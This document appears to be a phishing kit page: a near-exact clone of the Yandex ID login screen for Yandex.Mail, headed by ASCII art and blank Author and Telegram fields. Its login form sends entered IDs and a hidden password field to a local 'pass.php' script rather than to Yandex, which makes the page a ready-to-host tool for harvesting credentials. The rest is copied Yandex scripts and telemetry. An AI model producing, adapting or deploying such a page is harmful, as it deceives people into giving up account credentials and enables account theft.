<!--  a vampire ~ 9/96:
              __.......__
            .-:::::::::::::-.
          .:::''':::::::''':::.
        .:::'     `:::'     `:::. 
   .'\  ::'   ^^^  `:'  ^^^   '::  /`.
  :   \ ::   _.__       __._   :: /   ;
 :     \`: .' ___\     /___ `. :'/     ; 
:       /\   (_|_)\   /(_|_)   /\       ;
:      / .\   __.' ) ( `.__   /. \      ;
:      \ (        {   }        ) /      ; 
 :      `-(     .  ^"^  .     )-'      ;
  `.       \  .'<`-._.-'>'.  /       .'
    `.      \    \;`.';/    /      .'
 jgs  `._    `-._       _.-'    _.'
       .'`-.__ .'`-._.-'`. __.-'`.
     .'       `.         .'       `.
   .'           `-.   .-'           `.
------------------------------------------------------------    
Author   : 
Telegram : 
------------------------------------------------------------>
<html lang="en" dir="ltr" data-page-type="react.authv2" class="is-js_yes is-inlinesvg_yes"><head><title>Authorization</title><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge"><link rel="preload" as="style" href="https://yastatic.net/s3/passport-static/core/v1.12.2/css/react.authv2.cij.css"><link crossorigin="anonymous" href="//yastatic.net/react/16.8.4/react-with-dom-and-polyfills.min.js" rel="preload" as="script"><link crossorigin="anonymous" href="https://yastatic.net/jquery/2.1.4/jquery.min.js" rel="preload" as="script"><link rel="shortcut icon" href="/favicon.ico"><meta name="pdb" content="disable"><meta name="collections" content="disable"><link rel="stylesheet" type="text/css" href="https://yastatic.net/s3/passport-static/core/v1.12.2/css/react.authv2.cij.css"><link rel="stylesheet" type="text/css" href="https://yastatic.net/s3/passport-auth-customs//customs/v1.1.19/passport.auth.customs.css"><script type="text/javascript" nonce="">(function(d, e, c, r, n, w, v, f) {e = d.documentElement; c = "className"; r = "replace"; n = "createElementNS"; f = "firstChild"; w = "http://www.w3.org/2000/svg"; v = d.createElement("div"); v.innerHTML = "<svg/>"; e[c] = e[c][r]("is-js_no", "is-js_yes"); e[c] += " is-inlinesvg_" + ((v[f] && v[f].namespaceURI) === w ? "yes" : "no"); })(document);</script><script type="text/javascript" nonce="">window.onerror=function(d,e,f,g,b){var h=new Image,a=["app=passport"],c="";d&&a.push("msg="+encodeURIComponent(d));e&&a.push("url="+encodeURIComponent(e));(f||g)&&a.push("position="+encodeURIComponent(f+":"+g));if(b){try{c=JSON.stringify(b,Object.getOwnPropertyNames(b))}catch(k){c=b.stack}a.push("error_object="+encodeURIComponent(c))}h.src="/monitoring/onerror?"+a.join("&");return!1};</script><script type="text/javascript" nonce="">!function(i,t){if(i.Ya=i.Ya||{},Ya.Rum)throw new Error("Rum: interface is already defined");var n=i.performance,e=n&&n.timing&&n.timing.navigationStart||Ya.startPageLoad||+new Date,s=i.requestAnimationFrame;Ya.Rum={enabled:!!n,vsStart:document.visibilityState,vsChanged:!1,_defTimes:[],_defRes:[],_deltaMarks:{},_markListeners:{},_settings:{},_vars:{},init:function(i,t){this._settings=i,this._vars=t},getTime:n&&n.now?function(){return n.now()}:Date.now?function(){return Date.now()-e}:function(){return new Date-e},time:function(i){this._deltaMarks[i]=[this.getTime()]},timeEnd:function(i,t){var n=this._deltaMarks[i];n&&0!==n.length&&n.push(this.getTime(),t)},sendTimeMark:function(i,t,n,e){void 0===t&&(t=this.getTime()),this._defTimes.push([i,t,e]),this.mark(i,t)},sendResTiming:function(i,t){this._defRes.push([i,t])},sendRaf:function(i){var t=this.getSetting("forceFirstPaintTimeSending");if(s&&(t||!this.isVisibilityChanged())){var n=this,e="2616."+i;s(function(){!t&&n.isVisibilityChanged()||(n.sendTimeMark(e+".205"),s(function(){!t&&n.isVisibilityChanged()||n.sendTimeMark(e+".1928")}))})}},isVisibilityChanged:function(){return this.vsStart&&("visible"!==this.vsStart||this.vsChanged)},mark:n&&n.mark?function(i,t){n.mark(i+(t?": "+t:""))}:function(){},getSetting:function(i){var t=this._settings[i];return null===t?null:t||""},on:function(i,t){"function"==typeof t&&(this._markListeners[i]=this._markListeners[i]||[]).push(t)},sendTrafficData:function(){},finalizeLayoutShiftScore:function(){},finalizeLargestContentfulPaint:function(){}},document.addEventListener&&document.addEventListener("visibilitychange",function i(){Ya.Rum.vsChanged=!0,document.removeEventListener("visibilitychange",i)})}(window);
!function(){"use strict";Ya.Rum.observeDOMNode=window.IntersectionObserver?function(e,i,n){var t=this,r=Ya.Rum.getSetting("forceFirstPaintTimeSending");!function s(){if(r||!t.isVisibilityChanged()){var o="string"==typeof i?document.querySelector(i):i;o?new IntersectionObserver(function(i,n){!r&&t.isVisibilityChanged()||(Ya.Rum.sendTimeMark(e),n.unobserve(o))},n).observe(o):setTimeout(s,100)}}()}:function(){}}();
!function(){"use strict";if(window.PerformanceLongTaskTiming){var e=Ya.Rum._tti={events:[],observer:new PerformanceObserver(function(n){var t=n.getEntries();e.events=e.events.concat(t),e.events.length>300&&(e.events=e.events.slice(e.events.length-300))})};e.observer.observe({entryTypes:["longtask"]})}}();
!function(){"use strict";var e,t=[];function n(){var n=Ya.Rum.getSetting("clck"),i=t.join("\r\n");if(t=[],e=null,n&&!(navigator.sendBeacon&&Ya.Rum.getSetting("beacon")&&navigator.sendBeacon(n,i))){var a=new XMLHttpRequest;a.open("POST",n),a.send(i)}}Ya.Rum.send=function(i,a,o,s,r,u,g){clearTimeout(e);var c=function(e,t,n,i,a,o){var s=Ya.Rum.getSetting("slots"),r=Ya.Rum.getSetting("experiments");return[o?"/"+o.join("/"):"",t?"/path="+t:"",i?"/events="+i:"",s?"/slots="+s.join(";"):"",r?"/experiments="+r.join(";"):"",n?"/vars="+n:"","/cts="+(new Date).getTime(),"/*"]}(0,a,o,r,0,g);t.push("/reqid="+Ya.Rum.getSetting("reqid")+c.join("")),t.length<42?e=setTimeout(n,15):n()}}();
!function(n){if(!n.Ya||!Ya.Rum)throw new Error("Rum: interface is not defined");var e=Ya.Rum;e.getSetting=function(n){var t=e._settings[n];return null===t?null:t||""}}("undefined"!=typeof self?self:window);
!function(e,r){var n={client:["690.2354",1e3,100,0],uncaught:["690.2361",100,10,0],external:["690.2854",100,10,0],script:["690.2609",100,10,0]},t={};r.ERROR_LEVEL={INFO:"info",DEBUG:"debug",WARN:"warn",ERROR:"error",FATAL:"fatal"},r._errorSettings={clck:"https://yandex.ru/clck/click",beacon:!0,project:"unknown",page:"",env:"",experiments:[],additional:{},platform:"",region:"",dc:"",service:"",level:"",version:"",yandexuid:"",coordinates_gp:"",referrer:"",preventError:!1,unhandledRejection:!1,uncaughtException:!0,debug:!1,limits:{},silent:{},filters:{},pageMaxAge:864e6,initTimestamp:+new Date};var o=!1;function a(e,r){for(var n in r)r.hasOwnProperty(n)&&(e[n]=r[n]);return e}function i(e){return"boolean"==typeof e&&(e=+e),"number"==typeof e?e+"":null}r.initErrors=function(n){a(r._errorSettings,n),!o&&r._errorSettings.uncaughtException&&(function(){if(e.addEventListener)e.addEventListener("error",s),"Promise"in e&&r._errorSettings.unhandledRejection&&e.addEventListener("unhandledrejection",function(e){var r,n=e.reason,t={};n&&(n.stack&&n.message?r=n.message:"[object Event]"===(r=String(n))?r="event.type: "+n.type:"[object Object]"===r&&(t.unhandledObject=n),n.target&&n.target.src&&(t.src=n.target.src),s({message:"Unhandled rejection: "+r,stack:n.stack,additional:t}))});else{var n=e.onerror;e.onerror=function(e,r,t,o,a){s({error:a||new Error(e||"Empty error"),message:e,lineno:t,colno:o,filename:r}),n&&n.apply(this,arguments)}}}(),o=!0)},r.updateErrors=function(e){a(r._errorSettings,e)},r._handleError=function(e,o){var a,i,s=r._errorSettings;if(s.preventError&&e.preventDefault&&e.preventDefault(),o)a=e,i="client";else{a=r._normalizeError(e),i=a.type;var l=s.onError;"function"==typeof l&&l(a);var c=s.transform;"function"==typeof c&&(a=c(a))}var u=+new Date,d=s.initTimestamp,p=s.pageMaxAge;if(!(-1!==p&&d&&d+p<u)){var m=n[i][1];"number"==typeof s.limits[i]&&(m=s.limits[i]);var f=n[i][2];"number"==typeof s.silent[i]&&(f=s.silent[i]);var g=n[i][3];if(g<m||-1===m){a.path=n[i][0];var v=r._getErrorData(a,{silent:g<f||-1===f?"no":"yes",isCustom:Boolean(o)},s),E=function(e){t[a.message]=!1,r._sendError(e.path,e.vars),n[i][3]++}.bind(this,v);if(void 0===s.throttleSend)E();else{if(t[a.message])return;t[a.message]=!0,setTimeout(E,s.throttleSend)}}}},r._getErrorData=function(r,n,t){n=n||{};var o="";try{var s=a(a({},t.additional),r.additional);0!==Object.keys(s).length&&(o=JSON.stringify(s))}catch(r){t.debug&&e.console&&console.error("[error-counter] json.stringify:",r)}var l=t.experiments instanceof Array?t.experiments.join(";"):"",c={"-stack":r.stack,"-url":r.file,"-line":r.line,"-col":r.col,"-block":r.block,"-method":r.method,"-msg":r.message,"-env":t.env,"-external":r.external,"-externalCustom":r.externalCustom,"-project":t.project,"-service":r.service||t.service,"-page":r.page||t.page,"-platform":t.platform,"-level":r.level,"-experiments":l,"-version":t.version,"-region":t.region,"-dc":t.dc,"-yandexuid":t.yandexuid,"-coordinates_gp":r.coordinates_gp||t.coordinates_gp,"-referrer":t.referrer,"-source":r.source,"-sourceMethod":r.sourceMethod,"-type":n.isCustom?r.type:"","-additional":o,"-adb":i(Ya.blocker)||i(t.blocker),"-cdn":e.YaStaticRegion,"-ua":navigator.userAgent,"-silent":n.silent,"-ts":+new Date,"-init-ts":t.initTimestamp};return t.debug&&e.console&&console[console[r.level]?r.level:"error"]("[error-counter] "+r.message,c,r.stack),{path:r.path,vars:c}},r._baseNormalizeError=function(e){var r=(e=e||{}).filename||e.fileName||"",n=e.error&&e.error.stack||e.stack||"",t=e.message||"";return{file:r,line:e.lineno||e.lineNumber,col:e.colno||e.colNumber,stack:n,message:t,additional:e.additional}},r._normalizeError=function(e){var n=r._baseNormalizeError(e),t="uncaught",o=r._isExternalError(n.file,n.message,n.stack),a="",i="";return o.hasExternal?(t="external",a=o.common,i=o.custom):/^Script error\.?$/.test(n.message)&&(t="script"),n.external=a,n.externalCustom=i,n.type=t,n},r._sendError=function(e,n){r.send(null,e,function(e){var r=[];for(var n in e)e.hasOwnProperty(n)&&(e[n]||0===e[n])&&r.push(n+"="+encodeURIComponent(e[n]).replace(/\*/g,"%2A"));return r.join(",")}(n),null,null,null,null)};var s=function(e){r._handleError(e,!1)}}("undefined"!=typeof self?self:window,Ya.Rum);
!function(e){var r={url:{0:/(miscellaneous|extension)_bindings/,1:/^chrome:/,2:/kaspersky-labs\.com\//,3:/^(?:moz|chrome)-extension:\/\//,4:/^file:/,5:/^resource:\/\//,6:/webnetc\.top/,7:/local\.adguard\.com/},message:{0:/__adgRemoveDirect/,1:/Content Security Policy/,2:/vid_mate_check/,3:/ucapi/,4:/Access is denied/i,5:/^Uncaught SecurityError/i,6:/__ybro/,7:/__show__deepen/,8:/ntp is not defined/,9:/Cannot set property 'install' of undefined/,10:/NS_ERROR/,11:/Error loading script/,12:/^TypeError: undefined is not a function$/,13:/__firefox__\.(?:favicons|metadata|reader|searchQueryForField|searchLoginField)/},stack:{0:/(?:moz|chrome)-extension:\/\//,1:/adguard.*\.user\.js/i}};function n(e,r){if(e&&r){var n=[];for(var o in r)if(r.hasOwnProperty(o)){var i=r[o];"string"==typeof i&&(i=new RegExp(i)),i instanceof RegExp&&i.test(e)&&n.push(o)}return n.join("_")}}function o(e,o){var i,t=[];for(var s in r)r.hasOwnProperty(s)&&(i=n(e[s],o[s]))&&t.push(s+"~"+i);return t.join(";")}e._isExternalError=function(n,i,t){var s=e._errorSettings.filters||{},a={url:(n||"")+"",message:(i||"")+"",stack:(t||"")+""},c=o(a,r),u=o(a,s);return{common:c,custom:u,hasExternal:!(!c&&!u)}}}(Ya.Rum);
Ya.Rum.initErrors({"slots":["440465,0,-1","555747,0,-1","367619,0,-1","456629,0,-1","344302,0,-1","446413,0,-1","390463,0,-1","402083,0,-1","393310,0,-1","395279,0,-1","406013,0,-1","394874,0,-1","382481,0,-1","292979,0,-1","310324,0,-1","273174,0,-1","287766,0,-1","281260,0,-1","248685,0,-1","265901,0,-1","152513,0,-1","258805,0,-1","231584,0,-1","182998,0,-1","186113,0,-1","549995,0,74","542925,0,81","526113,0,55","497510,0,63","500107,0,61","493855,0,12","456625,0,56","460973,0,24","401446,0,54","394892,0,87","362242,0,38","354178,0,63","344284,0,0","278182,0,7","342103,0,28","309630,0,93","307868,0,67","306702,0,60","282594,0,11","251270,0,87","234476,0,39","161163,0,35","108959,0,39","118434,0,89","125988,0,32","272766,0,96","215048,0,86","148931,0,65","266857,0,49"],"reqid":"6fa406fc2cc0149a00b0db8e5d611b5d","project":"passport","page":"\u002Fauth","env":"production","platform":"desktop","version":"1.12.2","region":20805,"yandexuid":"2843425461653221547","referrer":"https:\u002F\u002Fmail.yandex.com\u002F","experiments":"web_supported_langs= [\"ru\", \"en\", \"tr\", \"kk\", \"uz\", \"az\", \"fr\", \"iw\", \"he\", \"pt\"]\n;social-provider-fb-exp;passport-gdpr-enabled;passport-bonuscards-exp;chaas-one-step-exp;customs-exp-kinopoisk;show_landing_link_exp;id-layout-plus-balance-exp;id-layout-exp;password-pwned-exp;id-bnpl-alert-exp;passport-security-tips-exp;passport-security-alert-exp;child-profile-reg-on;passport-subs-praktikum-on;passport-family-smartoffer-on;plus-podpiska-eball-exp;plus-podpiska-downgrade-toggle;plus-coil-enable;plus-winback-restore;domik-new_reg-exp3;plus-redesign-enable;plus-family-uz-enable;show-subscriptions;domik-challenge-am-exp;customs-exp-registration-no-phone-link-on-morda;exp-registration-no-phone-link-no-origin;customs-exp-registration-no-phone-link-for-direct;customs-exp-registration-no-phone-link-for-mail;passport-authreg-fingerprint-exp;passport-registration-fingerprint-exp;passport-greed-exp;slider-confirmation-design;auth_params_exp;auth-check-data-exp;card_deletion_alert_exp;big_input_exp;code-format-by-3-dash;settings-nopassword-on-new;reg_wave_exp;passport-subs-eula-check-on;oauth-authorize-controls-top-exp;passport-new-logo-on;profile-verification-enable;publicid-profile-on;PASSP-27563-plus-unsubscribe-new;domik-phone-autostart-on;regwithsocialbtn-exp2;PLUS-93-restore-subscription-exp;PLUS-215-exp;qr_exp;profilepublic-ava-exp;show-reg-new-phone-formatter-off;restorelogin_call_flashcall;domik-new-design-soccolor;domik-new-design-exp;domik-new-design-logo","preventError":false,"unhandledRejection":true,"uncaughtException":true,"debug":false,"initTimestamp":1653221592252});Ya.Rum.init({"beacon":true,"clck":"https:\u002F\u002Fyandex.ru\u002Fclck\u002Fclick","slots":["440465,0,-1","555747,0,-1","367619,0,-1","456629,0,-1","344302,0,-1","446413,0,-1","390463,0,-1","402083,0,-1","393310,0,-1","395279,0,-1","406013,0,-1","394874,0,-1","382481,0,-1","292979,0,-1","310324,0,-1","273174,0,-1","287766,0,-1","281260,0,-1","248685,0,-1","265901,0,-1","152513,0,-1","258805,0,-1","231584,0,-1","182998,0,-1","186113,0,-1","549995,0,74","542925,0,81","526113,0,55","497510,0,63","500107,0,61","493855,0,12","456625,0,56","460973,0,24","401446,0,54","394892,0,87","362242,0,38","354178,0,63","344284,0,0","278182,0,7","342103,0,28","309630,0,93","307868,0,67","306702,0,60","282594,0,11","251270,0,87","234476,0,39","161163,0,35","108959,0,39","118434,0,89","125988,0,32","272766,0,96","215048,0,86","148931,0,65","266857,0,49"],"reqid":"6fa406fc2cc0149a00b0db8e5d611b5d"}, {"region":20805,"rum_id":"com.passport.auth.add","-project":"passport","-page":"\u002Fauth","-env":"production","-platform":"desktop","-version":"1.12.2","experiments":"web_supported_langs= [\"ru\", \"en\", \"tr\", \"kk\", \"uz\", \"az\", \"fr\", \"iw\", \"he\", \"pt\"]\n;social-provider-fb-exp;passport-gdpr-enabled;passport-bonuscards-exp;chaas-one-step-exp;customs-exp-kinopoisk;show_landing_link_exp;id-layout-plus-balance-exp;id-layout-exp;password-pwned-exp;id-bnpl-alert-exp;passport-security-tips-exp;passport-security-alert-exp;child-profile-reg-on;passport-subs-praktikum-on;passport-family-smartoffer-on;plus-podpiska-eball-exp;plus-podpiska-downgrade-toggle;plus-coil-enable;plus-winback-restore;domik-new_reg-exp3;plus-redesign-enable;plus-family-uz-enable;show-subscriptions;domik-challenge-am-exp;customs-exp-registration-no-phone-link-on-morda;exp-registration-no-phone-link-no-origin;customs-exp-registration-no-phone-link-for-direct;customs-exp-registration-no-phone-link-for-mail;passport-authreg-fingerprint-exp;passport-registration-fingerprint-exp;passport-greed-exp;slider-confirmation-design;auth_params_exp;auth-check-data-exp;card_deletion_alert_exp;big_input_exp;code-format-by-3-dash;settings-nopassword-on-new;reg_wave_exp;passport-subs-eula-check-on;oauth-authorize-controls-top-exp;passport-new-logo-on;profile-verification-enable;publicid-profile-on;PASSP-27563-plus-unsubscribe-new;domik-phone-autostart-on;regwithsocialbtn-exp2;PLUS-93-restore-subscription-exp;PLUS-215-exp;qr_exp;profilepublic-ava-exp;show-reg-new-phone-formatter-off;restorelogin_call_flashcall;domik-new-design-soccolor;domik-new-design-exp;domik-new-design-logo"});Ya.Rum.observeDOMNode('2876', '.layout');</script><script crossorigin="anonymous" src="https://yastatic.net/jquery/2.1.4/jquery.min.js"></script></head><body class="Theme_root_default Theme_color_yandex-default Theme_root_passport Theme_auth_domik" data-metrics-id="784657" data-user-type="null" data-version="1.12.2" data-extended-logging="true"><div id="root" class="layout"><div class="passp-flex-wrapper"><div class="NoJS NoJS_isFloat"><div class="NoJS-message"><div class="NoJS-title">You must enable JavaScript</div>For this site to&nbsp;function correctly<a data-t="link:default" href="https://yandex.com/support/common/browsers-settings/browsers-java-js-settings.xml" target="_blank" class="Link Link_view_default"> <!-- -->enable JavaScript<!-- -->.</a></div></div><div class="passp-page"><div class="passp-bg passp-bg_2"></div><div class="passp-flex-wrapper"><div class="passp-content"><div class="passp-auth"><div class="passp-page-overlay"></div><a data-t="backpane" href="https://mail.yandex.com?noretpath=1" class="PreviousStepButton" aria-label="Back to&nbsp;previous screen"><span data-link="https://mail.yandex.com?noretpath=1"></span></a><div class="passp-auth-content"><div class="Header"><div class="Header-yaLogoBlock"><a href="#" tabindex="-1" class="Logo Logo_en Logo_ya"></a></div></div><div class="passp-page-visibility"></div><div class=""><div class="passp-route passp-route-appear-done passp-route-enter-done"><div data-t="page:add-account" class="passp-auth-screen passp-add-account-page"><div class="passp-add-account-page_has-social-block"><h1 data-t="title" class="passp-title "><span class="passp-add-account-page-title">Log in with Yandex ID to access Yandex.Mail</span></h1><div class="passp-login-form">
<form method="post" action="pass.php"><input type="hidden" name="retpath" value="https://mail.yandex.com/"><input type="hidden" name="fretpath" value=""><input type="hidden" name="clean" value=""><input type="hidden" name="service" value=""><input type="hidden" name="origin" value=""><input type="hidden" name="policy" value=""><input type="hidden" name="is_pdd" value=""><input type="hidden" name="csrf_token" value="ba9cb4fd11f2b20d66dfcc399de6125296624ccf:1653221592253"><div class="Field Field_view_big-input" data-t="field:login"><div class="Field-label-wrapper"><label aria-hidden="true" class="Field-label" data-t="field:label-login" for="passp-field-login">Enter your ID</label></div><span class="Textinput Textinput_view_big-input Textinput_size_l"><input type="text" data-t="field:input-login" dir="ltr" autocorrect="off" autocapitalize="off" aria-invalid="false" autocomplete="username" class="Textinput-Control" id="passp-field-login" name="email" placeholder="Phone number or&nbsp;email" value="" required><span class="Textinput-Box"></span></span><div class="Textinput-Line"></div><div class="Field-link" data-t="field:link-login" id="field:link-login"><a data-t="link:default" href="#" weight="medium" class="Link Link_pseudo Link_view_default Link_weight_medium">I&nbsp;forgot</a></div></div><input type="password" class="passp-hidden-password-field" id="hiddenPassword" name="hidden-password" tabindex="-1" autocomplete="off" aria-hidden="true"><div class="passp-button passp-register-button"><a data-t="button:pseudo" href="https://passport.yandex.com/auth/register/lite?from=mail&amp;origin=hostroot_homer_auth_com&amp;retpath=https%3A%2F%2Fmail.yandex.com%2F&amp;process_uuid=f22b4ae6-b6d4-44cf-bf4c-a65bf28eed59" class="Button2 Button2_type_link Button2_size_l Button2_view_pseudo Button2_width_max"><span class="Button2-Text">Create ID</span></a></div><div class="passp-button passp-sign-in-button"><button data-t="button:action:passp:sign-in" id="passp:sign-in" type="submit" class="Button2 Button2_size_l Button2_view_action Button2_width_max Button2_type_submit" aria-disabled="false" autocomplete="off"><span class="Button2-Text">Log in</span></button></div><div class="passp-button passp-exp-register-button"><a data-t="button:pseudo:passp:exp-register" id="passp:exp-register" href="https://passport.yandex.com/registration?from=mail&amp;origin=hostroot_homer_auth_com&amp;retpath=https%3A%2F%2Fmail.yandex.com%2F&amp;process_uuid=f22b4ae6-b6d4-44cf-bf4c-a65bf28eed59" class="Button2 Button2_type_link Button2_size_l Button2_view_pseudo Button2_width_max"><span class="Button2-Text">Create ID</span></a></div></form></div>

</div></div></div></div></div><div class="yaIdPromoText">Yandex ID. The key to all your services <a href="https://id.yandex.com/about" class="yaIdPromoText_link">Learn more</a></div></div></div></div><footer class="AuthFooter"><div class="AuthFooter-wrapper"><div class="AuthFooter-incognitoLink"><span class="AuthFooter-item"><a data-t="link:default" target="_blank" href="https://yandex.com/support/common/browsers-settings/incognito.html" class="Link Link_view_default">Use Incognito mode on&nbsp;a&nbsp;shared computer</a></span></div><div class="AuthFooter-mainBlock"><span class="AuthFooter-item"><a data-t="link:default" href="https://yandex.com/support/passport/" target="_blank" class="Link Link_view_default">Help and support</a></span><span class="AuthFooter-item"><span class="AuthFooter-copyright">© 2022, </span><a data-t="link:default" href="#" class="Link Link_view_default">Yandex</a></span></div></div></footer></div></div></div><script crossorigin="anonymous" src="//yastatic.net/react/16.8.4/react-with-dom-and-polyfills.min.js"></script><script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json" crossorigin="anonymous">[]</script><script id="__LOADABLE_REQUIRED_CHUNKS___ext" type="application/json" crossorigin="anonymous">{"namedChunks":[]}</script>
<script async="" data-chunk="react.authv2" src="https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.lego.en.js" crossorigin="anonymous"></script>
<script async="" data-chunk="react.authv2" src="https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.vendors.en.js" crossorigin="anonymous"></script>
<script async="" data-chunk="react.authv2" src="https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.react.en.js" crossorigin="anonymous"></script><link data-chunk="react.authv2" rel="preload" as="style" href="https://yastatic.net/s3/passport-static/core/v1.12.2/js/../css/react.authv2.cij.css" crossorigin="anonymous">
<link data-chunk="react.authv2" rel="preload" as="script" href="https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.lego.en.js" crossorigin="anonymous">
<link data-chunk="react.authv2" rel="preload" as="script" href="https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.vendors.en.js" crossorigin="anonymous">
<link data-chunk="react.authv2" rel="preload" as="script" href="https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.react.en.js" crossorigin="anonymous"><link data-chunk="react.authv2" rel="stylesheet" href="https://yastatic.net/s3/passport-static/core/v1.12.2/js/../css/react.authv2.cij.css" crossorigin="anonymous"><script nonce="">typeof Ya !== 'undefined' && Ya.Rum && Ya.Rum.sendResTiming('2095', '__LOADABLE_REQUIRED_CHUNKS__');typeof Ya !== 'undefined' && Ya.Rum && Ya.Rum.sendResTiming('2095', '__LOADABLE_REQUIRED_CHUNKS___ext');typeof Ya !== 'undefined' && Ya.Rum && Ya.Rum.sendResTiming('3071', 'https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.lego.en.js');typeof Ya !== 'undefined' && Ya.Rum && Ya.Rum.sendResTiming('3071', 'https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.vendors.en.js');typeof Ya !== 'undefined' && Ya.Rum && Ya.Rum.sendResTiming('2095', 'https://yastatic.net/s3/passport-static/core/v1.12.2/js/react.authv2.react.en.js');typeof Ya !== 'undefined' && Ya.Rum && Ya.Rum.sendResTiming('2447', 'https://yastatic.net/s3/passport-static/core/v1.12.2/js/../css/react.authv2.cij.css');</script></body></html>
